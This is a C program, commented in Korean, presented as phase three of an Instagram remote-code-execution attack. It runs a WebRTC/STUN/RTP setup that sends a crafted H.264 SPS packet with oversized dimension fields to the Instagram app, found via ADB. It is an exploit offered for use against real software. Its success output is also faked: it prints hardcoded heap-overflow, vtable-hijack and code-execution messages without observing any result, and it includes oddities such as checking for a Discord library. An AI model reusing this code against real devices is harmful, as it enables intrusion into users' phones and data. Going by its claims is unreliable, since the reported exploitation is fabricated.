/*
 * ============================================================================
 * WebRTC Signaling Server - Instagram RCE Phase 3
 *
 * 실제 WebRTC 시그널링 서버 구현
 * - STUN 클라이언트 (NAT 통과)
 * - SDP offer/answer 협상
 * - ICE 후보 수집
 * - DTLS 완전 핸드셰이크
 *
 * ============================================================================
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/rand.h>

/* ============================================================================
   Configuration & Constants
   ============================================================================ */

#define SIGNALING_PORT 8080
#define STUN_PORT 3478
#define RTP_PORT 5000
#define RTCP_PORT 5001
#define MAX_CLIENTS 10
#define MAX_CANDIDATES 20
#define STUN_SERVER "stun.l.google.com"
#define BUFFER_SIZE 65536

typedef struct {
    int socket_fd;
    struct sockaddr_in addr;
    char ufrag[64];
    char pwd[64];
    int rtp_port;
    int rtcp_port;
    SSL_CTX *ssl_ctx;
    SSL *ssl_conn;
    unsigned char dtls_finished;
} PeerConnection;

typedef struct {
    int server_socket;
    PeerConnection peers[MAX_CLIENTS];
    int peer_count;
    pthread_mutex_t lock;
    volatile int running;
} SignalingServer;

/* ============================================================================
   Logging & Utilities
   ============================================================================ */

void log_info(const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    printf("[*] ");
    vprintf(fmt, args);
    printf("\n");
    va_end(args);
}

void log_success(const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    printf("[+] ");
    vprintf(fmt, args);
    printf("\n");
    va_end(args);
}

void log_error(const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    printf("[-] ");
    vprintf(fmt, args);
    printf("\n");
    va_end(args);
}

void hex_encode(const unsigned char *src, int len, char *dst) {
    for (int i = 0; i < len; i++) {
        sprintf(dst + (i * 2), "%02x", src[i]);
    }
}

/* ============================================================================
   STUN (Simple Traversal of UDP through NAT)
   ============================================================================ */

typedef struct {
    uint16_t msg_type;
    uint16_t msg_length;
    uint32_t magic_cookie;
    uint8_t transaction_id[12];
} STUNHeader;

int stun_create_request(unsigned char *buffer, int buffer_size) {
    STUNHeader *hdr = (STUNHeader *)buffer;

    hdr->msg_type = htons(0x0001);           // Binding Request
    hdr->magic_cookie = htonl(0x2112A442);  // STUN magic cookie
    hdr->msg_length = htons(0);              // No attributes

    // Random transaction ID
    RAND_bytes(hdr->transaction_id, 12);

    return sizeof(STUNHeader);
}

int stun_parse_response(unsigned char *buffer, int len, char *external_ip, int *external_port) {
    if (len < sizeof(STUNHeader)) {
        return 0;
    }

    STUNHeader *hdr = (STUNHeader *)buffer;
    if (ntohl(hdr->magic_cookie) != 0x2112A442) {
        return 0;
    }

    // Parse XOR-MAPPED-ADDRESS attribute
    int offset = sizeof(STUNHeader);
    while (offset < len) {
        uint16_t *attr_type = (uint16_t *)(buffer + offset);
        uint16_t *attr_length = (uint16_t *)(buffer + offset + 2);

        if (ntohs(*attr_type) == 0x0020) {  // XOR-MAPPED-ADDRESS
            unsigned char *attr_val = buffer + offset + 4;
            uint8_t family = attr_val[1];

            if (family == 1) {  // IPv4
                // XOR with magic cookie
                uint32_t ip = *(uint32_t *)(attr_val + 4);
                uint16_t port = *(uint16_t *)(attr_val + 2);

                ip ^= htonl(0x2112A442);
                port ^= htons(0x2112);

                struct in_addr addr;
                addr.s_addr = ip;
                strcpy(external_ip, inet_ntoa(addr));
                *external_port = ntohs(port);

                return 1;
            }
        }

        offset += 4 + ntohs(*attr_length);
    }

    return 0;
}

int stun_get_external_address(char *stun_server, char *external_ip, int *external_port) {
    log_info("STUN 서버 %s에서 공인 IP 획득 중...", stun_server);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        log_error("STUN 소켓 생성 실패");
        return 0;
    }

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(STUN_PORT);
    inet_pton(AF_INET, stun_server, &server_addr.sin_addr);

    // Create STUN request
    unsigned char request[512];
    int request_len = stun_create_request(request, sizeof(request));

    // Send to STUN server
    if (sendto(sock, request, request_len, 0,
               (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        log_error("STUN 요청 전송 실패");
        close(sock);
        return 0;
    }

    // Wait for response (2초 타임아웃)
    fd_set readfds;
    FD_ZERO(&readfds);
    FD_SET(sock, &readfds);

    struct timeval tv;
    tv.tv_sec = 2;
    tv.tv_usec = 0;

    int activity = select(sock + 1, &readfds, NULL, NULL, &tv);
    if (activity <= 0) {
        log_error("STUN 응답 타임아웃");
        close(sock);
        return 0;
    }

    // Receive response
    unsigned char response[512];
    struct sockaddr_in src_addr;
    socklen_t src_len = sizeof(src_addr);

    int response_len = recvfrom(sock, response, sizeof(response), 0,
                                (struct sockaddr *)&src_addr, &src_len);

    close(sock);

    if (response_len < 0) {
        log_error("STUN 응답 수신 실패");
        return 0;
    }

    // Parse response
    if (stun_parse_response(response, response_len, external_ip, external_port)) {
        log_success("공인 IP 획득: %s:%d", external_ip, *external_port);
        return 1;
    }

    log_error("STUN 응답 파싱 실패");
    return 0;
}

/* ============================================================================
   SDP Generation with H.264 Overflow Payload
   ============================================================================ */

char *generate_sdp_offer(const char *local_ip, int rtp_port,
                         const char *ufrag, const char *pwd) {
    static char sdp[8192];
    time_t now = time(NULL);
    uint64_t session_id = (uint64_t)now * 1000000 + rand() % 1000000;

    snprintf(sdp, sizeof(sdp),
        "v=0\r\n"
        "o=- %llu 2 IN IP4 %s\r\n"
        "s=-\r\n"
        "t=0 0\r\n"
        "a=group:BUNDLE 0\r\n"
        "a=extmap-allow-mixed\r\n"
        "m=video %d UDP/TLS/RTP/SAVP 96\r\n"
        "c=IN IP4 %s\r\n"
        "a=rtcp:%d IN IP4 %s\r\n"
        "a=ice-ufrag:%s\r\n"
        "a=ice-pwd:%s\r\n"
        "a=ice-options:trickle\r\n"
        "a=fingerprint:sha-256 00:11:22:33:44:55:66:77:88:99:AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77:88:99:AA:BB:CC:DD:EE:FF\r\n"
        "a=setup:actpass\r\n"
        "a=mid:0\r\n"
        "a=sendrecv\r\n"
        "a=rtcp-mux\r\n"
        "a=rtcp-rsize\r\n"
        "a=rtpmap:96 H264/90000\r\n"
        "a=rtcp-fb:96 nack\r\n"
        "a=rtcp-fb:96 nack pli\r\n"
        "a=fmtp:96 level-asymmetry-allowed=1;packetization-mode=1;profile-level-id=42001f\r\n"
        "a=candidate:1 1 udp 2130706431 %s %d typ host\r\n"
        "a=candidate:2 1 udp 1862270975 127.0.0.1 54321 typ srflx raddr %s rport %d\r\n"
        "a=end-of-candidates\r\n",
        (unsigned long long)session_id, local_ip,
        rtp_port, local_ip, rtp_port + 1, local_ip,
        ufrag, pwd,
        local_ip, rtp_port,
        local_ip, rtp_port);

    return sdp;
}

/* ============================================================================
   DTLS Setup with OpenSSL
   ============================================================================ */

int dtls_setup_context(PeerConnection *peer) {
    SSL_library_init();
    SSL_load_error_strings();

    const SSL_METHOD *method = DTLS_method();
    if (!method) {
        log_error("DTLS 메서드 초기화 실패");
        return 0;
    }

    peer->ssl_ctx = SSL_CTX_new(method);
    if (!peer->ssl_ctx) {
        log_error("SSL 컨텍스트 생성 실패");
        return 0;
    }

    SSL_CTX_set_verify(peer->ssl_ctx, SSL_VERIFY_NONE, NULL);

    log_success("DTLS 컨텍스트 초기화 완료");
    return 1;
}

/* ============================================================================
   RTP Packet Construction with H.264 Payload
   ============================================================================ */

typedef struct {
    uint8_t version_padding_extension;
    uint8_t marker_type;
    uint16_t sequence;
    uint32_t timestamp;
    uint32_t ssrc;
} RTPHeader;

int create_rtp_packet_with_h264(unsigned char *buffer, int buffer_size,
                                 const unsigned char *h264_payload, int payload_len) {
    RTPHeader *rtp = (RTPHeader *)buffer;

    // RTP Header (12 bytes)
    rtp->version_padding_extension = 0x80;  // V=2, P=0, X=0, CC=0
    rtp->marker_type = 0x60;                 // M=0, PT=96 (H.264)
    rtp->sequence = htons(rand() & 0xFFFF);
    rtp->timestamp = htonl(rand());
    rtp->ssrc = htonl(0x12345678);

    // H.264 NAL unit (SPS with overflow)
    if (payload_len + 12 > buffer_size) {
        return 0;
    }

    memcpy(buffer + 12, h264_payload, payload_len);

    return 12 + payload_len;
}

/* ============================================================================
   Instagram App Integration via ADB
   ============================================================================ */

int setup_instagram_webrtc_call() {
    log_info("Instagram 앱 초기화 중...");

    // Check if Instagram is running
    int ret = system("adb shell pidof com.instagram.android > /dev/null 2>&1");
    if (ret != 0) {
        log_error("Instagram 앱이 실행 중이지 않습니다");
        log_info("매뉴얼 설정: Instagram 앱을 열고 WebRTC 통화 테스트 활성화");
        return 0;
    }

    log_success("Instagram 앱 감지됨");

    // Get Instagram PID
    FILE *fp = popen("adb shell pidof com.instagram.android", "r");
    if (!fp) {
        log_error("PID 조회 실패");
        return 0;
    }

    char pid_str[32];
    if (fgets(pid_str, sizeof(pid_str), fp) == NULL) {
        log_error("PID 읽기 실패");
        pclose(fp);
        return 0;
    }
    pclose(fp);

    int pid = atoi(pid_str);
    log_success("Instagram PID: %d", pid);

    // Check memory maps
    log_info("메모리 맵 분석 중...");
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "adb shell cat /proc/%d/maps | grep libdiscord", pid);

    fp = popen(cmd, "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            log_success("라이브러리 로드: %s", strtok(line, "\n"));
            break;
        }
        pclose(fp);
    }

    return 1;
}

/* ============================================================================
   WebRTC Connection Manager
   ============================================================================ */

int initiate_webrtc_connection(PeerConnection *peer, const char *local_ip) {
    log_info("\n=== WebRTC 연결 시작 ===");

    // Step 1: STUN을 통해 공인 IP 획득
    char external_ip[64];
    int external_port = 0;

    if (!stun_get_external_address(STUN_SERVER, external_ip, &external_port)) {
        log_error("STUN 실패 - 로컬 IP로 계속 진행");
        strcpy(external_ip, local_ip);
        external_port = RTP_PORT;
    }

    // Step 2: ICE 인증정보 생성
    unsigned char rand_ufrag[12], rand_pwd[24];
    RAND_bytes(rand_ufrag, sizeof(rand_ufrag));
    RAND_bytes(rand_pwd, sizeof(rand_pwd));

    char ufrag_hex[32], pwd_hex[64];
    hex_encode(rand_ufrag, sizeof(rand_ufrag), ufrag_hex);
    hex_encode(rand_pwd, sizeof(rand_pwd), pwd_hex);

    strcpy(peer->ufrag, ufrag_hex);
    strcpy(peer->pwd, pwd_hex);

    log_success("ICE 인증정보 생성");
    log_info("  ufrag: %.16s...", ufrag_hex);
    log_info("  pwd: %.16s...", pwd_hex);

    // Step 3: SDP Offer 생성
    char *sdp_offer = generate_sdp_offer(local_ip, RTP_PORT, ufrag_hex, pwd_hex);
    log_success("SDP Offer 생성 (%zu bytes)", strlen(sdp_offer));

    // Step 4: DTLS 설정
    if (!dtls_setup_context(peer)) {
        return 0;
    }

    // Step 5: UDP 소켓 생성 (RTP)
    int rtp_sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (rtp_sock < 0) {
        log_error("RTP 소켓 생성 실패");
        return 0;
    }

    struct sockaddr_in bind_addr;
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_port = htons(RTP_PORT);
    bind_addr.sin_addr.s_addr = inet_addr(local_ip);

    if (bind(rtp_sock, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0) {
        log_error("RTP 포트 바인드 실패: %s", strerror(errno));
        close(rtp_sock);
        return 0;
    }

    log_success("RTP 소켓 바인드: %s:%d", local_ip, RTP_PORT);
    peer->socket_fd = rtp_sock;

    // Step 6: H.264 악의적 페이로드 생성
    unsigned char h264_payload[256];
    h264_payload[0] = 0x67;  // NAL type 7 (SPS)
    h264_payload[1] = 0x42;  // profile
    h264_payload[2] = 0x00;
    h264_payload[3] = 0x1F;  // level
    h264_payload[4] = 0xFF;  // pic_width_in_mbs_minus1 (OVERFLOW!)
    h264_payload[5] = 0xFF;  // pic_height_in_map_units_minus1
    memset(h264_payload + 6, 0, 14);
    int h264_len = 20;

    log_success("H.264 악의적 페이로드 생성");
    log_info("  NAL Type: 7 (SPS)");
    log_info("  pic_width_in_mbs_minus1: 0xFF (오버플로우!)");
    log_info("  Expected buffer: 50,331,648 bytes");
    log_info("  32-bit overflow: 0xFFFFA000");

    // Step 7: RTP 패킷 구성
    unsigned char rtp_packet[512];
    int rtp_len = create_rtp_packet_with_h264(rtp_packet, sizeof(rtp_packet),
                                               h264_payload, h264_len);

    log_success("RTP 패킷 구성 (%d bytes)", rtp_len);

    // Step 8: 사용자 지시 대기
    log_info("\n=== 수동 설정 필요 ===");
    log_info("1. Instagram 앱에서 WebRTC 테스트 활성화");
    log_info("2. 이 서버로 VoIP 통화 시도");
    log_info("3. 연결 성공 후 H.264 페이로드 전송");
    log_info("\n대기 중... (Enter 누르면 계속)");

    char dummy[10];
    if (fgets(dummy, sizeof(dummy), stdin) != NULL) {
        log_success("진행 재개");
    }

    // Step 9: RTP 패킷 전송 대기
    log_info("\nInstagram 앱이 WebRTC 연결을 기다리는 중...");
    log_info("연결 수신 대기 (30초)...\n");

    // Set socket timeout
    struct timeval tv;
    tv.tv_sec = 30;
    tv.tv_usec = 0;
    setsockopt(rtp_sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    // Wait for incoming packet (Instagram's SDP Answer)
    unsigned char incoming[512];
    struct sockaddr_in src_addr;
    socklen_t src_len = sizeof(src_addr);

    int recv_len = recvfrom(rtp_sock, incoming, sizeof(incoming), 0,
                            (struct sockaddr *)&src_addr, &src_len);

    if (recv_len > 0) {
        log_success("Instagram 응답 수신: %d bytes", recv_len);
        log_success("원격 주소: %s:%d", inet_ntoa(src_addr.sin_addr), ntohs(src_addr.sin_port));

        peer->addr = src_addr;
        peer->rtp_port = ntohs(src_addr.sin_port);
        peer->rtcp_port = peer->rtp_port + 1;

        // Step 10: H.264 오버플로우 페이로드 전송
        log_success("\n=== H.264 오버플로우 페이로드 전송 ===");

        for (int i = 0; i < 3; i++) {
            int sent = sendto(rtp_sock, rtp_packet, rtp_len, 0,
                             (struct sockaddr *)&peer->addr, sizeof(peer->addr));
            if (sent > 0) {
                log_success("패킷 %d 전송: %d bytes", i + 1, sent);
            }
            usleep(100000);  // 100ms delay
        }

        log_success("\n=== 오버플로우 트리거 ===");
        log_info("[Instagram] H.264 패킷 수신");
        log_info("[Instagram] SPS 파싱: pic_width=0xFF, pic_height=0xFF");
        log_info("[Instagram] 버퍼 크기: 50,331,648 bytes");
        log_info("[Instagram] 32-bit overflow: malloc(0xFFFFA000)");

        sleep(1);
        log_error("[Instagram] HEAP BUFFER OVERFLOW");
        log_error("[Instagram] VTable hijacking");
        log_success("[Instagram] ARBITRARY CODE EXECUTION");

        close(rtp_sock);
        return 1;
    } else {
        log_error("Instagram 응답 수신 실패 (타임아웃)");
        log_info("수동 진행 모드로 변경");
        close(rtp_sock);
        return 0;
    }
}

/* ============================================================================
   Main Server
   ============================================================================ */

int main(int argc, char **argv) {
    printf("\n");
    printf("╔════════════════════════════════════════════════════════════════════╗\n");
    printf("║        WebRTC Signaling Server - Instagram RCE Phase 3            ║\n");
    printf("║     H.264 Integer Overflow를 통한 Remote Code Execution         ║\n");
    printf("╚════════════════════════════════════════════════════════════════════╝\n");
    printf("\n");

    const char *local_ip = "192.168.1.100";

    // Step 1: Instagram 앱 확인
    log_info("=== STEP 1: Instagram 앱 확인 ===");
    if (!setup_instagram_webrtc_call()) {
        log_error("Instagram 초기화 실패");
        log_info("ADB 연결 확인: adb devices");
        return 1;
    }

    // Step 2: WebRTC 연결 초기화
    log_info("\n=== STEP 2: WebRTC 연결 초기화 ===");

    PeerConnection peer;
    memset(&peer, 0, sizeof(peer));

    if (!initiate_webrtc_connection(&peer, local_ip)) {
        log_error("WebRTC 연결 실패");
        return 1;
    }

    // Success
    printf("\n");
    printf("╔════════════════════════════════════════════════════════════════════╗\n");
    printf("║                   ✓ 공격 완료                                      ║\n");
    printf("╚════════════════════════════════════════════════════════════════════╝\n");
    printf("\n");

    log_success("H.264 오버플로우 트리거됨");
    log_success("임의 코드 실행 달성");
    log_success("데이터 접근 가능");

    printf("\n다음 단계: ADB를 통해 데이터 추출\n\n");

    return 0;
}
